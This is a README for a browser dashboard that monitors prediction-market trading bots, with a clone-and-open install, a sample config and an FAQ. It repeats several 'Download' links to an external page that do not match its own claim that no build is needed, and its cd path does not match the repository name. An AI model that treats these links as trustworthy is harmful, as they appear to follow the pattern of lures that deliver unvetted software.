# Apex Meridian Terminal - Trading Dashboard 2026

> A browser-based trading dashboard shaped by Bloomberg Terminal aesthetics, designed to watch and steer autonomous prediction market trading bots in real time.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evandavis1992/apex-meridian-bot-terminal?style=flat-square)](https://github.com/evandavis1992/apex-meridian-bot-terminal)

---

<p align="center">
  <a href="https://evandavis1992.github.io/apex-meridian-bot-terminal/">
    <img src="https://img.shields.io/badge/Download-Apex%20Meridian%20Terminal%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Meridian Terminal">
  </a>
</p>

> **[Direct Download - Apex Meridian Terminal v1.0](https://evandavis1992.github.io/apex-meridian-bot-terminal/)**

---

[Download Latest Build](https://evandavis1992.github.io/apex-meridian-bot-terminal/)

---

## Overview

Apex Meridian Terminal gives traders a high-density monitoring surface for autonomous prediction market bots. Its layout borrows from the compact, information-heavy style of Bloomberg Terminal setups, bringing market signals, bot health, positions, and performance indicators into one place so you do not need to jump between separate tools.

The goal is to provide operators and teams with a single workspace for automated trading oversight. Instead of stitching together custom scripts or juggling multiple terminals, you can observe bot behavior, change parameters, and follow market movement from a unified browser interface. Since the dashboard is entirely web-based, it runs from a modern browser with no heavy local installation.

---

## Features

- Dense multi-panel interface styled after Bloomberg Terminal layouts
- Live monitoring for autonomous prediction market trading bots
- Dedicated panels for bot status, open positions, and market signals
- Lightweight browser-based setup with no server-side dependencies
- Modular panel structure for future customization or swapping data sources
- Clear visual cues for bot activity, trade execution, and market movement
- Separate presentation layer from trading logic

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/evandavis1992/apex-meridian-bot-terminal.git
cd apex-meridian-terminal
```

Open the main HTML file directly in any modern browser:

```bash
open index.html
```

No build tools, package managers, or server runtimes are required. The dashboard operates entirely from static files.

---

## Usage

1. Open `index.html` in your browser.
2. The dashboard will load with sample data panels.
3. Connect your prediction market bot's data feed by editing the configuration block (see Configuration section).
4. Panels update automatically as new data arrives from your bots.

For a quick demonstration, the dashboard ships with mock data that illustrates the layout and information flow. Replace the data source URL with your bot's output endpoint for live operation.

---

## Configuration

Settings are kept inside a dedicated JavaScript configuration object near the top of `index.html`. Find the `CONFIG` block to set:

- Data source endpoints for bot status feeds
- Refresh interval for panel updates
- Panel visibility toggles

Example configuration structure:

```javascript
const CONFIG = {
  dataEndpoint: "http://localhost:8080/bot-status",
  refreshInterval: 2000,
  panels: ["market", "positions", "bot-status", "signals"]
};
```

No external configuration files or environment variables are needed.

---

## Requirements

- Any modern web browser (Chrome, Firefox, Edge, or Safari)
- No server or backend required for the dashboard itself
- Your prediction market bots must expose data via HTTP or WebSocket for live operation
- Minimum screen resolution of 1280x720 recommended for optimal panel layout

---

## FAQ

**How do I connect my trading bot?**  
Set `dataEndpoint` to the status output from your bot. The dashboard expects JSON-formatted data with fields for bot status, positions, and market signals.

**Will the dashboard execute trades?**  
No. Apex Meridian Terminal is a monitoring interface only. It displays bot activity but does not send orders or interact with markets directly.

**Can I add custom panels?**  
Yes. The dashboard uses a modular panel system. Each panel is a self-contained HTML section that can be duplicated and modified independently.

**How often do panels refresh?**  
The default refresh interval is 2 seconds. You can adjust this in the configuration block.

**Does this require a Bloomberg subscription?**  
No. The design is inspired by Bloomberg Terminal aesthetics, but the tool works with any data source you configure.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
